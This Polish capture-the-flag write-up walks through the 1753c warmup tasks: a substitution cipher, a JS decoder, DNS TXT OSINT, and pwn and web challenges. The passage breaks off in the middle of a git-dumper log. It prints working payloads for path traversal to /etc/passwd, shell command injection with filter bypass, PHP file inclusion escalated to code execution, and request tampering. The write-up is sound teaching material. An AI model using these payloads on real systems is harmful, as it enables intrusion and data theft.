# 1753c - Warmup

### Crypto
- [Szymfr](#szymfr)
- [Scrypto](#scrypto)

### OSINT

- [Jak zostałem hakerem](#jak-zostałem-hakerem)
- [Sekrecik](#sekrecik)

### PWN

- [Egzamin z angielskiego](#egzamin-z-angielskiego)
- [Kontrola umysłu](#kontrola-umysłu)

### Web

- [Klikzarzutka](#klikzarzutka)
- [Wyciek](#wyciek)
- [Gildia internetowych troli](#gildia-internetowych-troli)

### MISC

- [Śmieszna maupa](#śmieszna-maupa)
- [Śmieszne zagadki](#śmieszne-zagadki)

## Crypto

### Szymfr

Zadanie kieruje nas do strony na pastebin z następującą zaszyfrowaną wiadomością:

```
HS'KS FX LRKDFWSKL RX NXZS
BXM VFXH ROS KMNSL DFT LX TX E
D QMNN JXYYERYSFR'L HODR E'Y ROEFVEFW XQ
BXM HXMNTF'R WSR ROEL QKXY DFB XROSK WMB
E CMLR HDFFD RSNN BXM OXH E'Y QSSNEFW
WXRRD YDVS BXM MFTSKLRDFT
FSZSK WXFFD WEZS BXM MA
FSZSK WXFFD NSR BXM TXHF
FSZSK WXFFD KMF DKXMFT DFT TSLSKR BXM
FSZSK WXFFD YDVS BXM JKB
FSZSK WXFFD LDB WXXTGBS
FSZSK WXFFD RSNN D NES DFT OMKR BXM
HS'ZS VFXHF SDJO XROSK QXK LX NXFW
BXMK OSDKR'L GSSF DJOEFW GMR BXM'KS RXX LOB RX LDB ER
EFLETS HS GXRO VFXH HODR'L GSSF WXEFW XF
HS VFXH ROS WDYS DFT HS'KS WXFFD ANDB ER
DFT EQ BXM DLV YS OXH E'Y QSSNEFW
TXF'R RSNN YS BXM'KS RXX GNEFT RX LSS
FSZSK WXFFD WEZS BXM MA
FSZSK WXFFD NSR BXM TXHF
FSZSK WXFFD KMF DKXMFT DFT TSLSKR BXM
FSZSK WXFFD YDVS BXM JKB
FSZSK WXFFD LDB WXXTGBS
FSZSK WXFFD RSNN D NES DFT OMKR BXM
FSZSK WXFFD WEZS BXM MA
FSZSK WXFFD NSR BXM TXHF
FSZSK WXFFD KMF DKXMFT DFT TSLSKR BXM
FSZSK WXFFD YDVS BXM JKB
FSZSK WXFFD LDB WXXTGBS
FSZSK WXFFD RSNN D NES DFT OMKR BXM
FSZSK WXFFD WEZS, FSZSK WXFFD WEZS
(WEZS BXM MA)
HS'ZS VFXHF SDJO XROSK QXK LX NXFW
BXMK OSDKR'L GSSF DJOEFW GMR BXM'KS RXX LOB RX LDB ER
EFLETS HS GXRO VFXH HODR'L GSSF WXEFW XF
HS VFXH ROS WDYS DFT HS'KS WXFFD ANDB ER
E CMLR HDFFD RSNN BXM OXH E'Y QSSNEFW
WXRRD YDVS BXM MFTSKLRDFT
FSZSK WXFFD WEZS BXM MA
FSZSK WXFFD NSR BXM TXHF
FSZSK WXFFD KMF DKXMFT DFT TSLSKR BXM
FSZSK WXFFD YDVS BXM JKB
FSZSK WXFFD LDB WXXTGBS
FSZSK WXFFD RSNN D NES DFT OMKR BXM
FSZSK WXFFD WEZS BXM MA
FSZSK WXFFD NSR BXM TXHF
FSZSK WXFFD KMF DKXMFT DFT TSLSKR BXM
FSZSK WXFFD YDVS BXM JKB
FSZSK WXFFD LDB WXXTGBS
FSZSK WXFFD RSNN D NES DFT OMKR BXM
FSZSK WXFFD WEZS BXM MA
FSZSK WXFFD NSR BXM TXHF
FSZSK WXFFD KMF DKXMFT DFT TSLSKR BXM
FSZSK WXFFD YDVS BXM JKB
FSZSK WXFFD LDB WXXTGBS
 
1753J{FEWTB_JES_FES_UDHESTUES}
```

Ostatnia linia przypomina flagę, ale litery na niej są pozamieniane. Można więc wnioskować, że litery zostały w jakiś sposób poprzestawiane. Zaczyna się więc zabawa w odkrywanie kolejnych liter. Skoro flaga ma format 1753c, to J = c. Idziemy dalej i szukamy słów które mogą tam wystąpić a mają dość charakterystyczną formę lub budowę. Np. pojedyncza litera D = a, które w angielskim jest przedimkiem. HS'KS to we've lube we're, ale jak się okazuje to ta druga możliwość jest poprawna. 

Idąc tak dalej zaczynamy widzieć całe słowa lub frazy, co pozwala jeszcze szybciej znajdować kolejne litery, aż w końcu odkrywamy, że zostaliśmy... strolowani. 

Cały ten tekst to tak naprawdę "Never gonna give you up" Ricka Astleya. Dzięki temu odkrywamy pozostałe litery i dokonując identycznych podmian w ostatniej linii otrzymujemy flagę.

### Scrypto

W zadaniu otrzymujemy zaszyfrowany plik oraz fragment kodu źródłowego (w języku JavaScript).

```javascript
!function(){const e=require("fs"),n=e.readFileSync("secret.txt",{encoding:"ascii"}).split("").map(e=>e.charCodeAt());for(let e=0;e<n.length;e++){const i=e%256;n[e]=(n[e]+i)%256}const i=String.fromCharCode(...n);e.writeFileSync("enc.bin",i,{encoding:"ascii"})}();
```

Kod wrzucamy do jakiegoś prettiera i możemy otrzymać go w nieco przyjaźniej wyglądającej postaci:

```javascript
const e = require("fs"),
    n = e
      .readFileSync("secret.txt", { encoding: "ascii" })
      .split("")
      .map((e) => e.charCodeAt());
  for (let e = 0; e < n.length; e++) {
    const i = e % 256;
    n[e] = (n[e] + i) % 256;
  }
  const i = String.fromCharCode(...n);
  e.writeFileSync("enc.bin", i, { encoding: "ascii" });
```

Jak widać funkcja do kodu ACII każdej kolejnej litery dodaje liczbę i która jest indeksem tej litery modulo 256. Na koniec jeżeli wynik jest większy niż 256, to taką właśnie wartość dodatkowo od niej odejmujemy przy pomocy kolejnego modulo.

Musimy napisać funkcję która odwróci tą operację. Łatwo jest obliczyć nową wartość zmiennej i, bo jest ona dokładnie taka sama jak przy szyfrowaniu (indeks litery modulo 256). Wartość tę odejmujemy, ale żeby uzyskać poprawne rozwiązanie musimy jeszcze odwrócić działanie drugiego modulo. Ja dodawałem do wyniku 128, aż do momentu w którym wartość ASCII zaczęła być >= 32 (czyli znaku spacji). 

Finalny kod rozwiązania wygląda tak:

```javascript
const e = require("fs"),
  n = e
    .readFileSync("enc.bin", { encoding: "ascii" })
    .split("")
    .map((e) => e.charCodeAt());

for (let e = 0; e < n.length; e++) {
  const i = e % 256;
  n[e] = n[e] - i;
  while (n[e] < 32) n[e] += 128;
}

console.log(String.fromCharCode(...n));
```

## OSINT

### Jak zostałem hakerem

Wyszukać trzeba było z jakiego filmiku na YT pochodzi ten screenshot:

<img src="img/img.png?raw=true" width="400px" />

Podpowiedziałem trochę na swojej prezentacji pokazująć inny screenshot z tej samej prelekcji Samyego Kamkara. Wyszukiwanie obrazem w Google nie okazało się zbyt pomocne, ale wpisanie kawałka kodu z obrazka do Google już tak:

<img src="img/himyg.png?raw=true" width="400px" />

Wyszukanie właściwej prelekcji na YouTube to już tylko chwila, a w komentarzach znajdziemy taki w którym Dawid, którego z tego miejsca serdecznie pozdrawiam, opublikował flagę do tego zadania. 

### Sekrecik

To zadanie podobno spędzało Wam sen z powiek, a rozwiązanie jest raczej dość szybkie. Jak widać podany w zadaniu URL sekrecik.1753ctf.pl nie prowadzi raczej do nikąd. Niektórzy pytali nawet czy zadanie nie umarło, ale nie. Ta subdomena faktycznie nie jest nigdzie wpięta, co powie Wam np. komenda ping:

```bash
> ping sekrecik.1753ctf.pl
ping: cannot resolve sekrecik.1753ctf.pl: Unknown host
```

Oczywiście komenda ping odpowiada nam, że nie zna hosta, bo taką odpowiedź dostała z serwera DNS. Ale DNS to nie tylko rekordy wskazujące na to gdzie powinna przekierować nas przeglądarka. Zajrzyjmy więc do rekordów DNS dla sekrecik.1753ctf.pl, listując np. klucze typu TXT które z założenia zawierają dodatkowe informacje:

```bash
> host -t txt sekrecik.1753ctf.pl
sekrecik.1753ctf.pl descriptive text "MTc1M2N7c2lrYW1fbmFfc2llZHphY299"
```

Viola! Otrzymany text to flaga zdradzająca dosyć wstydliwy sekret autora zadania zakodowana przy pomocy Base64!

## PWN

### Egzamin z angielskiego
 
Z zadaniem łączymy się przy pomocy netcata i widzimy prostą przeglądarkę plików tekstowych. Wpisujemy nazwę pliku i pojawia nam się jego zawartość. Niestety kontrola dostępu nie pozwala na otwarcie pliku z flagą brzydko krzycząc "BRAK DOSTEMPU". 

Treść zadania mówi coś o jakiś kotach, więc możemy przypuszczać, że pod spodem wywoływana jest systemowa komenda `cat`. Możemy więc pokusić się o jakiś command injection. Najpierw jednak sprawdźmy czy ten cat jest tam po prostu wołany i wyświetli nam cokolwiek, np. wpisując dużo kropek i slashy możemy zrobić path traversal i odczytać plik etc/passwd:

```bash
wpisz nazwe: ../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
stefan:x:1000:1000::/home/stefan:/bin/sh
```

Super, no to w takim razie na ile możemy wywoływać komendy systemowe? Sprawdźmy to dodając średnik i wywołując komendę id:

```bash
wpisz nazwe: lista_pokemonow.txt ; id
Pikaczu
Rajczu
Bulbazaur
Ten taki smieszny z oczkami
Czarizard
Mjutu
Mjut
uid=1000(stefan) gid=1000(stefan) groups=1000(stefan)
```

O kurcze, nie tylko wyświetliliśmy pokemony, ale też wykonaliśmy komendę. No to nie pozostaje nic innego jak wypisać sobie ten plik z flagą, ale okazuje się, że niektóre ze słów w inpucie są traktowane jako próba nieuprawnionego dostępu - nie możemy wpisać grep, nie możemy wpisać flaga, nie możemy użyć nawet gwiazdki, żeby wypisać catem wszystkie pliki w folderze.

Tutaj musimy być trochę kreatywni. Możemy np. przypisać sobie fragmenty niedozwolonej frazy do dwóch zmiennych a i b, a potem połączyć je wykonując cata:

```bash
; a=/pwn/articles/flag && b=a.txt && cat $a$b
```

W trakcie CTFa okazało się, że można jeszcze prościej bo cat akceptuje różne znaki specjalne wśród których poza zakazaną gwiazdką jest także znak zapytania. Flagę mogliśmy więc otrzymać wpisując również na przykład:

```bash
fl?ga.txt
```

### Kontrola umysłu

Łącząc się przy pomocy netcata zostaje nam zaproponowana gra w zgadywanie liczby o jakiej pomyślał przeciwnik. Co gorsza robić trzeba to szybko i bez namysłu, bo na podanie prawidłowej odpowiedzi mamy mniej niż sekundę. 

```bash
> nc 159.223.14.19 30302
Witaj w grze numer 284798
Zgadnij jaką liczbę pomyślałem? 
Zgaduj, a nie licz... zbyt wolno!
```

Na szczęście do zadania dołączony jest kod źródłowy w języku Python:

```python
#from pwn import *
import random
from datetime import datetime

MAX = 999999

games = range(0, MAX)
game = random.choice(games)

random.seed(game)
number = random.randint(0, MAX)

start = datetime.now()

print("Witaj w grze numer " + str(game))
val = input("Zgadnij jaką liczbę pomyślałem? ")

delta = (datetime.now() - start)
tooSlow = delta.seconds > 0

if tooSlow:
    print("Zgaduj, a nie licz... zbyt wolno!")
elif val == str(number):
    print("Brawo, 1753c{***********}")
else:
    print("No niestety... liczba którą pomyślałem, to " + str(number))
```

Już na pierwszy rzut oka widzimy ciekawą zależność. Podawany nam numer gry jest jednocześnie wartością która inicjalizuje generator liczb pseudolosowych. Znając więc ten numer (a jest on nam podawany) możemy łatwo przewidzieć jaką liczbę pomyślał nasz przeciwnik.

Pozostaje jedynie problem szybkiego obliczenia i wysłania odpowiedzi. Nie zrobimy tego ręcznie. Drobną podpowiedzią zostawioną w kodzie jest zakomentowany import biblioteki pwntools która do tego celu nada się idealnie.

Kod rozwiązania może wyglądać jak poniżej:

```python
import random
from pwn import *

conn = remote('159.223.14.19', 30302)

conn.recvuntil("Witaj w grze numer ".encode("utf-8"))
game = int(conn.recvline().decode("utf-8"))

question = conn.recvuntil("pomyślałem?".encode("utf-8"))

random.seed(game)
number = random.randint(0, 999999)

conn.send((str(number) + "\n").encode("utf-8"))

print(conn.recvline().decode("utf-8"))
```

## Web

### Klikzarzutka

Naszym oczom ukazuje się strona-wyzwanie. Wystarczy jedyne 10000 kliknięć w captchę i otrzymamy flagę. Podglądając jak pojedynczy request z captchą wygląda w Burpie widzimy, że wołany jest endpoint /nextStep do którego wysyłany jest kod recaptcha oraz wartość code która rośnie wraz z każdym kolejnym kliknięciem:

```http
POST /nextStep HTTP/2
Host: us-central1-captcha-master.cloudfunctions.net
Content-Length: 516
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Content-Type: application/json
Accept: */*
Origin: https://captcha-master.web.app
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://captcha-master.web.app/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

{"data":{"captcha":"03AGdBq25jsL7yuc2e-mfdlzpPClhbCLBWqduhYdug7WFeKR_1AHU8bC9IUx1MkfkA3Fvm6n2_b_6mKiqpS6-6LWZvqv1C1VVjuaenMhSXrdTpU-A16_sqYA1WWFPO0mSoSLiOnjg5JV49fgG_hJBf5XlYtZZ4Nqd5S0y4a3D8PkOY9sgLjmSlQUtsjIp7sYkDOfNycsYJdrO5cKaiVDmvxReNYGFlyzRFJcmrsP9EbKoPuvSd8lEE32U1MtZkS0uOMsh1UJmZrQLjl_3Rp1kiADxlhBEg8_he6p4Rw32XZi03WnYyUaXSakfXua-eX6UmBVEhprtpwjFk-iqof-l6b7RbCkzcqMDbon1InyjwgXbktWyrTQamrL3xvLwvkI4T7e5V5-elXcYV7BClnmktyS1UMLU9GZbe9CZKzzNFy5Lh_5zhXSVjmDKE_sUIQJGdNyEEcXDb1nVgclICMJBDtMSr8UXSi86Y-A","code":0}}
```

Na szczęście Burp jako narzędzie wspaniałe pozwala na zmianę takich żądań w locie. Wystarczy, że w karcie Proxy zaznaczone mamy "Intercept is on". Szybko łapiemy strzał i podmieniamy wartość parametru code na 9999. Tada! Flaga jest nasza.

### Wyciek

Oto i ona. Nowa strona 1753c. Chyba trochę jeszcze niedopracowana, ale wygląda już świetnie. Niestety jeden z linków nie działa, klikając w Zespół pojawia nam się błąd:

```
Warning: include(zepsul.html): failed to open stream: No such file or directory in /var/www/html/index.php on line 18

Warning: include(): Failed opening 'zepsul.html' for inclusion (include_path='.:/usr/share/php') in /var/www/html/index.php on line 18
```

No tak! W linku jest literówka. Błąd podpowiada nam jednak coś jeszcze. Plik wskazany w URLu jest ładowany przy pomocy phpowej funkcji include. Ups. To wygląda na local file inclusion. Sprawdźmy to próbując załączyć plik etc/passwd.

Wpisujemy url http://165.232.88.198/?page=/etc/passwd i oczom naszym ukazuje się taki oto widok:

<img src="img/etcpasswd.png?raw=true" width="400px" />

Nie wiemy jednak w jakim pliku znajduje się flaga. Przyda nam się eskalacja z LFI do RCE. Zajrzyjmy do kolejnej sekcji, czyli kontakt. Możemy wysłać wiadomość, ale dostajemy kolejny błąd:

```
Warning: Can't attach data from file: data/6224c784be7b1.txt in /var/www/html/index.php on line 12
```

Plik wskazany w błędzie możemy normalnie otworzyć w przeglądarce i zawiera on naszą wiadomość. Znaczy to, że możemy dowolny plik tekstowy zapisać na serwerze, a potem przy pomocy parametru page podać go do funkcji include i wykonać dowolny kod w języku PHP. Sprawdźmy więc jakie pliki znajdują się w folderze aplikacji przy pomocy kodu:

```php
<?php echo `ls` ?>
```

który w moim przypadku zapisał się do pliku data/6224c8296dab5.txt i wywołując nasz remote file inclusion wpisując adres http://165.232.88.198/?page=data/6224c8296dab5.txt dostajemy remote code execution i listę plików na serwerze:

```
data
home.html
index.php
kontakt.html
logo.png
onas.html
this_is_the_file_containg_our_flag.txt
zespol.html
```

z czego oczywiście jeden z plików zawiera naszą flagę. Wywołując podobny fragment kodu php jak poprzednio, ale używając cata możemy odczytać zawartość pliku this_is_the_file_containing_our_flag.txt i otrzymać flagę.

### Gildia internetowych troli

W zadaniu oprócz linka do pliku index.html w którym znajdziemy wyedytowaną flagę otrzymujemy również plik z logiem z programu dirb:

```
---

DIRB v2.22  
By The Dark Raver

---

START_TIME: Sun Feb 27 12:44:34 2022
URL_BASE: https://1753ctf.ams3.digitaloceanspaces.com/g/

---

GENERATED WORDS: 4612

---- Scanning URL: https://1753ctf.ams3.digitaloceanspaces.com/g/ ----

- https://1753ctf.ams3.digitaloceanspaces.com/g/.git/HEAD (CODE:200|SIZE:23)  
  (!) WARNING: All responses for this directory seem to be CODE = 403.  
   (Use mode '-w' if you want to scan it anyway)

---

END_TIME: Sun Feb 27 12:44:43 2022
DOWNLOADED: 109 - FOUND: 1
```

Wynika z niego nie mniej nie więciej to, że ktoś oprócz pliku ze stroną na hosting wrzucił także folder .git, który prawdopodobnie zawiera coś interesującego. 

Można by się pokusić o ręczne pobieranie kolejnych plików, szczególnie jeżeli znamy strukturę plików tego systemu kontroli wersji. Pliki z indeksami zawierają wtedy hashe potrzebne do odgadnięcia nazw plików znajdujących się w folderze objects, zawierających obecne i historyczne wersje plików źródłowych. My jednak skorzystamy z prostszego rozwiązania czyli automatycznego narzędzia git-dumper.

https://github.com/arthaud/git-dumper

Wywołanie jest dosyć proste:

```bash
> git-dumper https://1753ctf.ams3.digitaloceanspaces.com/g/ dump
[-] Testing https://1753ctf.ams3.digitaloceanspaces.com/g/.git/HEAD [200]
[-] Testing https://1753ctf.ams3.digitaloceanspaces.com/g/.git/ [403]
[-] Fetching common files
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/post-commit.sample [403]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.gitignore [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.gitignore responded with status code 403
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/post-commit.sample responded with status code 403
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/commit-msg.sample [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/post-receive.sample [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/post-receive.sample responded with status code 403
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/pre-applypatch.sample [200]
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/post-update.sample [200]
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/pre-receive.sample [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/COMMIT_EDITMSG [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/pre-commit.sample [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/applypatch-msg.sample [200]
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/description [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/update.sample [200]
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/index [200]
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/info/exclude [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/info/packs [403]
[-] https://1753ctf.ams3.digitaloceanspaces.com/g/.git/objects/info/packs responded with status code 403
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/pre-rebase.sample [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/hooks/pre-push.sample [200]
[-] Finding refs/
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
/opt/homebrew/lib/python3.9/site-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host '1753ctf.ams3.digitaloceanspaces.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
  warnings.warn(
[-] Fetching https://1753ctf.ams3.digitaloceanspaces.com/g/.git/FETCH_HEAD [403]
